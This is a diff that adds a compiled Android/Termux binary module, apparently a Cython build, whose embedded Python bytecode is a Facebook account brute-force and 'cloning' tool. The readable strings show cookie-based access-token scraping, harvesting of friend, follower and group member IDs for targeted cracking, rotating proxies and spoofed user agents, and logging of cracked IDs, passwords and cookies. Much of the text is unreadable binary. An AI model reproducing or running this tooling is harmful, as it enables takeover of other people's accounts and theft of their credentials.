@@ -1,0 +1,550 @@
+ELF              ê  4   h†     4   
+ ( !     4   4   4   @  @                       Ú  Ú           Ú  ê  ê  P  P           `ó  ` ` È  È           (ö  (& (& X   Ø            4ô  4 4 Ğ   Ğ         Råtd`ó  ` ` È           PåtdøÙ  øÙ  øÙ              Qåtd                              t  t  t  ˜   ˜            „      Android    r23b                                                            7779620                                                                                                                   U              f              x              ‘              £              ³              Ê              İ              é              ú                                        3             J             V             h             {             ‰             —             ¤             °             Ê             æ             ù                          +             <             f             w                          £             °             »             Æ             ç                                       (             7             D             S             b             |                          ¢             ³             Ã             Ï             à             î             û                                       )             ?             U             c             u             ‚             ’             ¢             µ             Á             Ø             ò                          /   €&       ;    '       @   €&       G   àê  *     J  €&                                                                                               c             F         ¬ ‰   ˆF   ØqXºã’|BEÕì^a‹ÅÒ'K   K   .       =   2   ?   $   *       1           9          J   #             4       '                  ,       <              F           D   -   (   I                  B           0       8      C          E             6      ;      G       %          H       >   A                                                                    	                   
+                                                                                          &                               )   +                              3           /            @       "   7   5       :   !        __cxa_atexit __cxa_finalize __register_atfork __bss_start _end _edata PyInit_litexx PyModuleDef_Init PyThreadState_Get PyInterpreterState_GetID PyExc_ImportError PyErr_SetString PyObject_GetAttrString PyModule_NewObject _Py_Dealloc PyModule_GetDict PyDict_SetItemString _Py_NoneStruct PyExc_AttributeError PyErr_ExceptionMatches PyErr_Clear __stack_chk_guard PyExc_RuntimeError PyOS_snprintf Py_GetVersion PyErr_WarnEx PyTuple_New PyBytes_FromStringAndSize PyUnicode_FromStringAndSize PyImport_AddModule PyObject_SetAttrString PyUnicode_InternFromString PyUnicode_Decode PyObject_Hash __pyx_module_is_main_litexx PyObject_SetAttr PyImport_GetModuleDict PyDict_GetItemString PyTuple_Pack PyList_New PyDict_New PyImport_ImportModuleLevelObject _PyThreadState_UncheckedGet _PyObject_GetDictPtr _Py_FalseStruct _Py_TrueStruct PyObject_Not PyErr_Occurred PyDict_SetItem _PyDict_GetItem_KnownHash PyObject_GetAttr PyUnicode_FromFormat PyUnicode_AsUTF8 PyCode_NewEmpty PyFrame_New PyTraceBack_Here PyMem_Realloc PyMem_Malloc __stack_chk_fail PyExc_NameError PyErr_Format Py_EnterRecursiveCall Py_LeaveRecursiveCall PyObject_Call PyExc_SystemError PyObject_Dir PyDict_Contains PyExc_TypeError PyEval_GetBuiltins PyCode_Type PyUnicode_AsUTF8String PyEval_MergeCompilerFlags PyEval_EvalCode PyRun_StringFlags libc.so LIBC /data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/lib libandroid-support.so libpython3.10.so.1.0 `    d    h    x    |    Œ             ¤    ´    ¸    È    Ì    Ü    à    ğ    ô            ,    0    <&    H&    L&    `&    h&                    (    )  $ 7  ( <  , ?  0 A   J  @   D   H   L   P   T   X   \ 	  ` 
+  d   h   l   p   t   x   |   €   „   ˆ   Œ      ”   ˜   œ       ¤   ¨    ¬ !  ° "  ´ #  ¸ $  ¼ %  À &  Ä '  È *  Ì +  Ğ ,  Ô -  Ø .  Ü /  à 0  ä 1  è 2  ì 3  ğ 4  ô 5  ø 6  ü 8    9   :   ;   =   >   @   B   C    D  $ E  parent %s Module 'litexx' has already been imported. Re-initialisation is not supported. exec: arg 1 must be string, bytes or code object, got %.200s  while calling a Python object litexx name %d.%d __file__ submodule_search_locations __loader__ __package__ init litexx __path__ code object passed to exec() may not contain free variables cython_runtime compiletime version %s of module '%.100s' does not match runtime version %s Interpreter change detected - this module can only be loaded into one interpreter per process. NULL result without error in PyObject_Call builtins /storage/emulated/0/Download/litexx.c  exec() arg 2 must be a dict, not %.200s %s (%s:%d) litexx.py loader origin name '%U' is not defined __builtins__ cline_in_traceback __import__ loads __main__ marshal __name__ ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsÃ  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsÃ  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns{Â  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsñÁ  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsgÁ  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsİÀ  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsSÀ  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsÉ¿  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns?¿  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nsµ¾  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns+¾  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns¡½  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns½  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns¼  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns¼  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nsy»  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nsïº  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nseº  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsÛ¹  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsQ¹  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsÇ¸  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns=¸  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns³·  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns)·  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsŸ¶  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns¶  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns‹µ  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nsµ  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nsw´  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nsí³  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nsc³  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsÙ²  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsO²  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsÅ±  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns;±  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns±°  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns'°  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns¯  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns¯  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns‰®  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nsÿ­  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nsu­  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nsë¬  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nsa¬  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns×«  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsM«  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsÃª  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns9ª  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns¯©  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns%©  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns›¨  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns¨  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns‡§  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nsı¦  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nss¦  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nsé¥  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns_¥  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsÕ¤  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsK¤  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsÁ£  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns7£  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns­¢  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns#¢  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns™¡  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns¡  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns…   ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsûŸ  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsqŸ  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nsç  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns]  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsÓ  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsI  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns¿œ  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns5œ  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns«›  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns!›  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns—š  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nsš  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nsƒ™  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nsù˜  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nso˜  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Nså—  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns[—  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsÑ–  ã                   @   s   d dl Z ee  d¡ƒ dS )é    NsG–  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns½•  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns3•  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns©”  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns”  ã                   @   s   d dl Z ee  d¡ƒ dS )é    Ns•“  ã                   @   s€  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
+Z
+d dlZd dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dl
+mZ d d	lmZ  d d
+l!m"Z# d dl
+mZ$ d dl
+m%Z% d dl&m'Z( e% )¡  eƒ Z*g Z+g Z,g Z-e  .¡ Z/g Z0ze  1d¡j2Z3e4ddƒ 5e3¡ W n e6y± Z7 z
+edƒ W Y dZ7[7ndZ7[7ww e4ddƒ 8¡  9¡ Z3e:dƒD ]´Z;dZ<e =dd¡Z>e =dd¡Z?dZ@e =dd¡Z7dZAe =dd¡ZBe =dd¡ZCe =dd¡ZDe =dd¡ZEdZFe<› e>› de?› de@› e7› eA› eB› deC› deD› deE› deF› ZGe+ HeG¡ dZIe Jg d¢¡Z>d Z?e Jg d!¢¡Z@e =dd"¡Z7e Jg d!¢¡ZAd#ZBe =d$d¡ZCd%ZDe =d&d'¡ZEe =d(d)¡ZFd*ZKeI› de>› d+e?› e@› e7› eA› d,eB› eC› deD› deE› deF› deK› ZLe, HeL¡ q¿e:d-ƒD ]`ZMd.Z<e =dd¡Z>e =dd¡Z?e Jg d!¢¡Z@e Jg d!¢¡Z7e Jg d!¢¡ZAe Jg d!¢¡ZBe =dd¡ZCd/ZDe =dd¡ZEe =dd¡ZFd0ZKe<› e>› d1e?› e@› e7› eA› eB› eC› eD› eE› deF› deK› ZNqxd2d3„ ZGg g d d d g g g g g g g g f\ZOZPaQaRaSZTZUZVZWZXZYZZZ[g Z-g g Z\Z]d4Z^d5Z_d6Z`d7Zad8Zbd9Zcd:Zdd;Zed<Zfd=Zgd>ZMd5Zhd?ZFd6ZCd@ZidAZjdBZkd:Z>dCZle JeheFeCeje>g¡ZmdDdEdFdGdHdIdJdKdLdMdNdOdPœZndDdEdFdGdHdIdJdKdLdMdNdQdRœZoej p¡ jqZrenesej p¡ jtƒ Zuej p¡ jvZwdSeserƒ dT eseuƒ dT esewƒ dU ZxdVeserƒ dT eseuƒ dT esewƒ dU ZydWdX„ ZzdYdZ„ Z{d[d\„ Z|d]d^„ Z}d_d`„ Z~dadb„ Zdcdd„ Z€dedf„ Zdgdh„ Z‚didj„ Zƒdkdl„ Z„e>dm eC dn e> do Z…dpdq„ Z†drds„ Z‡dtdu„ Zˆdvdw„ Z‰dxdy„ ZŠdzd{„ Z‹d|d}„ ZŒd~d„ Zd€d„ Zd‚dƒ„ Zd„d…„ Zd†d‡„ Z‘dˆd‰„ Z’e“dŠkr>ze ”d‹¡ W n   Y ze •dŒ¡ W n   Y ze •d¡ W n   Y ze •d¡ W n   Y ze ”d¡ W n   Y e~ƒ  dS dS )é    N)ÚTable)ÚConsole)ÚBeautifulSoup)ÚThreadPoolExecutor)ÚGroup)ÚPanel)Úprint)ÚMarkdown)ÚColumns)Úpretty)ÚTextzwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=allz	.prox.txtÚwu.   [[[1;92mâ€¢[1;97m] [[1;96mAlvino_adijaya_xyÚri'  z!Mozilla/5.0 (Symbian/3; Series60/é   é	   ZNokiaéd   i'  zl/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/é   zMobile Safari/535.1Ú.ú zMozilla/5.0 (Linux; U; Android)Ú6Ú7Ú8Ú9Ú10Ú11Ú12z en-us; GT-)ÚAÚBÚCÚDÚEÚFÚGÚHÚIÚJÚKÚLÚMÚNÚOÚPÚQÚRÚSÚTÚUÚVÚWÚXÚYÚZiç  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/éI   Ú0ih  i$  é(   é–   zMobile Safari/537.36z; z) é
+   z"Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-SzC; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/zMobile WVGA SMM-MMS/1.2.0 OPN-Bú/c                  C   sŠ   zt ddƒ ¡  ¡ } | D ]}t |¡ qW d S    t d¡j}t ddƒ} t 	dt
+|ƒ¡}|D ]	}|  |d ¡ q/t ddƒ ¡  ¡ } Y d S )Nz	bbnew.txtr   z0https://github.com/EC-1709/a/blob/main/bbnew.txtz
+.bbnew.txtr   zline">(.*?)<Ú
+)ÚopenÚreadÚ
+splitlinesÚugenÚappendÚrequestsÚgetÚtextÚreÚfindallÚstrÚwrite)ÚuaZubÚaÚaaZun© rL   ú<alvino>ÚuakuK   s   ÿ
+rN   z[1;97mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[0mz[1;30mz[41m[1;97mz[mz[93mz[32mz[95mz[33mz[0;34mZJanuaryZFebruaryZMarchZAprilZMayZJuneZJulyZAugustZ	SeptemberZOctoberZNovemberZDecember)Ú1Ú2Ú3Ú4Ú5r   r   r   r   r   r   r   ZDevember)Ú01Ú02Z03Z04Z05Z06Z07Z08Z09r   r   r   zOK-ú-z.txtzCP-c                 C   s2   | d D ]}t j |¡ t j ¡  t d¡ qd S )Nr<   g{®Gázt?)ÚsysÚstdoutrH   ÚflushÚtimeÚsleep)ÚuÚerL   rL   rM   Ú	alvino_xyy   s   2r^   c                   C   s   t  d¡ d S )NÚclear)ÚosÚsystemrL   rL   rL   rM   r_   {   s   r_   c                   C   s
+   t ƒ  d S )N)ÚloginrL   rL   rL   rM   Úback}   s   
+rc   c                  C   s$   t ƒ  tƒ  d} tt| ddƒ d S )NuH   Â© Brute force Facebook account
+â–„â–„â–„â–„Â· â–„â–„â–„  â–„â€¢ â–„â–Œâ–„â–„â–„â–„â–„â–„â–„â–„ .    Â·â–„â–„â–„â–„â–„â–„â–„Â· Â©   
+â–â–ˆ â–€â–ˆâ–ªâ–€â–„ â–ˆÂ·â–ˆâ–ªâ–ˆâ–ˆâ–Œâ€¢â–ˆâ–ˆ  â–€â–„.â–€Â·    â–â–„â–„Â·â–â–ˆ â–€â–ˆâ–ª. Author :Ahmed x Klein
+â–â–ˆâ–€â–€â–ˆâ–„â–â–€â–€â–„ â–ˆâ–Œâ–â–ˆâ–Œ â–â–ˆ.â–ªâ–â–€â–€â–ªâ–„    â–ˆâ–ˆâ–ª â–â–ˆâ–€â–€â–ˆâ–„. Team : NAYEM
+â–ˆâ–ˆâ–„â–ªâ–â–ˆâ–â–ˆâ€¢â–ˆâ–Œâ–â–ˆâ–„â–ˆâ–Œ â–â–ˆâ–ŒÂ·â–â–ˆâ–„â–„â–Œ    â–ˆâ–ˆâ–Œ.â–ˆâ–ˆâ–„â–ªâ–â–ˆ. Tool Type : Free
+Â·â–€â–€â–€â–€ .â–€  â–€ â–€â–€â–€  â–€â–€â–€  â–€â–€â–€     â–€â–€â–€ Â·â–€â–€â–€â–€ Úblue©Zstyle)r_   ÚsolÚcetakÚnel)ZbanrL   rL   rM   Úbanner€   s   ri   c                  C   sê   zgt ddƒ ¡ } t ddƒ ¡ }t | ¡ z&tjdtd  d|id}t |j¡d }t |j¡d	 }t	||ƒ W W d S  t
+yH   tƒ  Y W d S  tjjyg   d
+}t|dd}tƒ j|dd tƒ  Y W d S w  tyt   tƒ  Y d S w )Nú
+.token.txtr   ú.cok.txtz:https://graph.facebook.com/me?fields=id,name&access_token=r   Úcookie©ÚcookiesÚnameÚidz2# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAINÚredre   Úpurple)r=   r>   ÚtokenkurA   rB   rC   ÚjsonÚloadsrD   ÚmenuÚKeyErrorÚlogin_lagi334Ú
+exceptionsÚConnectionErrorÚmarkrf   r   ÚexitÚIOError)ÚtokenÚcokZsyZsy2Zsy3ÚliZlorL   rL   rM   rb   ‹   s(   
+üÿrb   c                  C   s>  zst  d¡ tƒ  ttdƒƒ t ttt	t
+tg¡} tdt	› dt› d| › dƒ}tjddd	d
+dddddddœ	d|id}t d|j¡}tddƒ | d¡¡}tddƒ |¡}tdt› dt	› dt› dt	› dt› dƒ t d¡ tƒ  W d S  ty } zt  d¡ t  d¡ tdtttttf ƒ tƒ  W Y d }~d S d }~ww ) Nr_   z?	             CINTO MANDI : [green]SEJAHTERA SELAMANYA[purple] z  [õ   â€¢z] Enter Cookies :r   z0https://business.facebook.com/business_locationsz§Mozilla/5.0 (Linux; Android 9; XIAOMI Mi Note 10 Pro Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.15.0zhttps://www.facebook.com/zbusiness.facebook.comzhttps://business.facebook.comrO   ú#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7ú	max-age=0z¬text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8ztext/html; charset=utf-8)	ú
+user-agentÚrefererZhostÚoriginúupgrade-insecure-requestsúaccept-languageúcache-controlÚacceptúcontent-typerl   )Úheadersrn   z	(EAAG\w+)rj   r   r   rk   z  ú[ú]z, LOGIN Done.........Run the Script Again!!!!zrm -f .token.txtzrm -f .cok.txtz5  %s[%sx%s]%s LOGIN Failed.....Put Cookies Again !!%s)r`   ra   ri   rg   rh   ÚrandomÚchoiceÚmÚkÚhÚbr\   ÚinputrB   rC   rE   ÚsearchrD   r=   rH   Úgroupr   rZ   r[   r|   Ú	ExceptionÚxrx   )Úasurl   ÚdataZ
+find_tokenZkenr   r]   rL   rL   rM   rx      s&   
+(2
+
+€ürx   c                 C   s
+  zt ddƒ ¡ }t ddƒ ¡ }W n ty%   tdƒ t d¡ tƒ  Y nw t d¡ t	ƒ  t
+ d¡j}tt› dt|ƒ ƒ tt› d	|› ƒ ttd
+ƒƒ tdƒ ttdƒƒ tdƒ}|dv retƒ  d S |dv r|t d¡ t d¡ tdƒ tƒ  d S tdƒ tƒ  d S )Nrj   r   rk   u   [Ã—] Cookies Kadaluarsa é   r_   zhttps://api.ipify.orgzID  : zIP  : uE   	[bold cyan]           â€¢ 5 FRIENDLIST CLONING TOOL â€¢ [/bold cyan]Ú z;[bold green] 1. Crack Public
+ 0. Remove Cookie [bold green]u   
+â¥â¥â£Choose : )rO   )r7   zrm -rf .token.txtzrm -rf .cookie.txtu   â¥â¥â£Success Logout u"   â¥â¥â£Choose the right one bro )r=   r>   r}   r   rZ   r[   rx   r`   ra   ri   rB   rC   rD   r^   r\   rG   r“   rg   rh   r•   Údump_massalr|   rc   )Zmy_nameZmy_idr~   r   ZipZ_____cowok__pink_____rL   rL   rM   rv   ±   s4   
+
+ı
+
+	
+
+
+
+rv   c                   C   s&   t t› dt› ƒ t d¡ tƒ  d S )Nu1   â¥â¥â£Sorry, this feature is still being fixedr   )r   r’   r\   rZ   r[   rc   rL   rL   rL   rM   ÚerrorÕ   s   
+
+rŸ   c                  C   sØ  t dƒ t dƒ t dƒ tdƒ} | dv r*zt d¡}W n ty1   t dƒ t d¡ tƒ  Y nw t|ƒd	krFt d
+ƒ t d¡ tƒ  d S d	}i }|D ]o}zt	d| dƒ 
+¡ }W n   Y qL|d7 }|dk r˜dt|ƒ }| t|ƒt|ƒi¡ | |t|ƒi¡ t d| d | d tt|ƒƒ d t ƒ qL| t|ƒt|ƒi¡ t dt|ƒ d | d tt|ƒƒ d t ƒ qLtdƒ}z|| }W n tyÖ   t dƒ tƒ  Y nw zt	d| dƒ ¡  ¡ }	W n   t dƒ t d¡ tƒ  Y d	}
+tt|	ƒƒD ]#}|	|
+  d¡}d|d	 › d|d › }tƒ   t|dd¡ |
+d7 }
+qıtdƒ tƒ  d S | dv rYzt d¡}W n tyL   t dƒ t d¡ tƒ  Y nw t|ƒd	krbt dƒ t d¡ tƒ  d S d	}i }|D ]s}zt	d| dƒ 
+¡ }W n   Y qh|d7 }|d k r·dt|ƒ }| t|ƒt|ƒi¡ | |t|ƒi¡ t d| d | d tt|ƒƒ d t ƒ qh| t|ƒt|ƒi¡ t dt|ƒ d | d tt|ƒƒ d t ƒ qhtdƒ}z|| }W n ty÷   t d!ƒ tƒ  Y nw zt	d| dƒ ¡  ¡ }	W n   t dƒ t d¡ tƒ  Y d	}
+tt|	ƒƒD ]1}|	|
+  d¡}d|d	 › d|d › }tƒ   t|d"d¡ t t› d#t› |d › ƒ |
+d7 }
+qtdƒ tƒ  d S | d$v rctƒ  d S t d!ƒ tƒ  d S )%Nu   â¥â¥â£Hasil OK Anda u   â¥â¥â£Hasil CP Anda u   â¥â¥â£Kembali	õ   
+â¥â¥â£Pilih : ©rO   rT   ÚCPu   â¥â¥â£File Tidak Di Temukan é   r   u&   â¥â¥â£Anda Tidak Memiliki Hasil CP é   úCP/r   r   r:   r7   r   ú] ú [ ú
+ Account ]õ!   â¥â¥â£Pilih Yang Bener Kontol ú|z# ID : z PASSWORD : Úyellowre   z[ Klik Enter ])rP   rU   ÚOKu&   â¥â¥â£Anda Tidak Mempunyai File OK úOK/r   u    â¥â¥â£Pilih Yang Bener TOLOL Úgreenz	COOKIE : )r7   Z00)r   r•   r`   ÚlistdirÚFileNotFoundErrorrZ   r[   rc   Úlenr=   Ú	readlinesrG   Úupdater\   rw   r|   r>   r?   ÚrangeÚsplitrf   r{   Úhh)ZkzÚvinÚcihÚlolÚisiÚhemÚnomÚgeehÚgehÚlinZnocpZcpkuZcpkuniZcpkuhrL   rL   rM   Ú4resultxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxÚ   s¾   
+
+
+ı
+
+
+.2
+ş
+
+
+
+
+
+ı
+
+
+04
+ş
+
+
+
+
+rÀ   c               
+   C   s  zt ddƒ ¡ } t ddƒ ¡ }W n ty   tƒ  Y nw zttdƒƒ}W n ty5   tdƒ tƒ  Y nw |dk s>|dkrEtdƒ tƒ  t 	¡ }d	}t
+|ƒD ]}|d7 }td
+t|ƒ d ƒ}t |¡ qOtD ]W}z9|jd| d td	  d|id ¡ }|d d D ]}	z|	d d |	d  }
+|
+tv r•nt |
+¡ W qƒ   Y qƒW qg ttfy­   Y qg tjjy¾   tdƒ tƒ  Y qgw ztdƒ tt› dt› tttƒƒ ƒ tƒ  W d S  tjjyğ   tt› ƒ tdƒ tƒ  Y d S  ttfy   tdt› dt› ƒ t d¡ tƒ  Y d S w )Nrj   r   rk   z(How Many IDs You Want To Dump {Max 5} : u   {k}â¥â¥â£Wrong Input r   rœ   u   â¥â¥â£Dont Cross Limit bro r   u   â¥â¥â£INPUT ID  z : z https://graph.facebook.com/v2.0/z)?fields=friends.limit(5000)&access_token=rn   rm   Zfriendsr›   rp   rª   ro   u   {k}â¥â¥â£Network Problem r   u   â¥â¥â£Total Id â˜…u   â¥â¥â£Network Problem u   â¥â¥â¥â£z Ids is not Public r£   )r=   r>   r}   r|   Úintr•   Ú
+ValueErrorr   rB   ÚSessionr´   rG   ÚuidrA   rC   rs   rt   rp   rw   ry   rz   r’   r”   r±   Úsettingr\   rc   rZ   r[   )r~   r   ZjumÚsesZyzZmetZklZuserrÚcolÚmiZisorL   rL   rM   r   <  sf   
+ÿ
+ş&
+
+€
+û
+ş
+
+ır   c               	   C   s  zt ddƒ ¡ } t ddƒ ¡ }W n ty   tƒ  Y nw tdƒ tdƒ}zDtjd| d td  d	|id
+ 	¡ }|d d D ]}zt
+ |d d |d  ¡ W q?   Y q?tdt› dttt
+ƒƒ ƒ tƒ  W d S  tjjy|   tdƒ tƒ  Y d S  ttfy   tdƒ tƒ  Y d S w )Nrj   r   rk   u8   â¥â¥â£Ketik ( me ) Jika Ingin Crack Follower Sendiri u   â¥â£Masukkan Idz Target : zhttps://graph.facebook.com/z.?fields=subscribers.limit(99999)&access_token=r   rl   rm   Zsubscribersr›   rp   rª   ro   u   â¥â¥â£Total Idz :r   u%   â¥â¥â£Koneksi Internet Bermasalah u    â¥â¥â£Gagal Mengambil Target )r=   r>   r}   r|   r   r•   rB   rC   rs   rt   rp   rA   r“   rG   r±   rÅ   ry   rz   rw   )r~   r   ZpilZkoh2ZpirL   rL   rM   ÚDdump_pengikutxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxk  s,   
+ÿ& 
+şrÉ   r   u   âœ“r   c                   C   s@   t dt t d tttƒƒ d ƒ ttt d ƒ 	 tƒ  d S )Núz [1;95mTotal ID  :[1;97m z                     zA[1;97m Klik [[1;96m Enter ][1;97m Jika Ingin Langsung Crack !!)r   Úbalmondr‘   rG   r±   rp   r•   rÅ   rL   rL   rL   rM   Úlahƒ  s   $
+rÌ   c                  C   s¨  t dƒ tdt t d ƒ} d}d|i}d|  }t ¡ }zt|j||djdƒ}W n tj	j
+yD   t tt d ƒ t d	¡ tƒ  Y nw | d
+¡}|j dd¡ dd¡}|dkrjt tt d ƒ t d	¡ tƒ  n|dkrttt d ƒ t d	¡ tƒ  n	 t dt t d | ƒ | d¡}g }	|D ]}
+|
+j}| dd¡}zt|ƒ}|	 |¡}W q•   Y q•t|	ƒdkrÀt tt d ƒ nt tt d t|	d ƒ ƒ t|ƒ d S )Nr   z& [1;94m>> Masukkan Idz Grup :[1;94m ú±Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gbar„   z#https://mbasic.facebook.com/groups/©rŒ   úhtml.parserz Koneksi Internet Terputus..g      à?Útitleú | Facebookú Grup PublikúMasuk Facebookz- Limit, Silahkan Mode Pesawat Dan Coba Lagi..Z	Kesalahanz Grup Tidak Ditemukan..z [1;94m>> Nama Grup :[1;97m ÚtableZAnggotar   z Anggota : -z [1;94m>> Anggota :[1;97m )r   r•   rË   r“   rB   rÃ   ÚparserrC   rD   ry   rz   r‘   rZ   r[   r|   ÚfindÚreplaceZ
+crack_grupZjalanÚpÚfind_allrÁ   rA   r±   rG   Zgrup1)rp   rI   ÚmiskinluÚurlrÆ   ZgnZberrZberr2ZggsZangZffZanggoZbroZmexZjumlahrL   rL   rM   ÚWgrupxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxˆ  sN   
+
+ı
+
+
+
+rÜ   c                 C   sŞ  g }t  ¡ }tdt t d ƒ ttt d ƒ ttt d ƒ 	 zd}d|i}z|d }W n   | }Y t|j||d	jd
+ƒ}| d¡}|D ]$}t	|ƒ 
+d¡}	d|	v rlt	|ƒ dd¡ dd¡}
+|
+ 
+d¡d  dd¡}qH| d¡}|D ] }|j}| 
+d¡}d|v rÈt dt	|ƒ¡}|d  dd¡}| dd¡}|d | }|tv r£qtt |¡ tdt t d t d t	ttƒƒ t d dd tj ¡  qtd|v rt dt	|ƒ¡}|d  dd¡}| 
+d¡d }|d | }|tv rïqtt |¡ tdt t d t d t	ttƒƒ t d dd tj ¡  qtqtz|}| dd| ¡ W n   | d ¡}|j d!d¡ d"d¡}|d#kr;ntƒ  Y W n- t jjya   zt d$¡ W n ty^   tƒ  Y nw Y n tym   tƒ  Y nw q!)%Nr   z+ [1;94mJika Berhenti, Mode Pesawat 5 Detikz [1;94mSedang Mengumpulkan IDz! [1;94mTekan CTRL + C Untuk StopTrÍ   r„   r   rÎ   rÏ   rJ   ú>zLihat Postingan Lainnya</spanz	<a href="zamp;r   z"><imgrÔ   Z
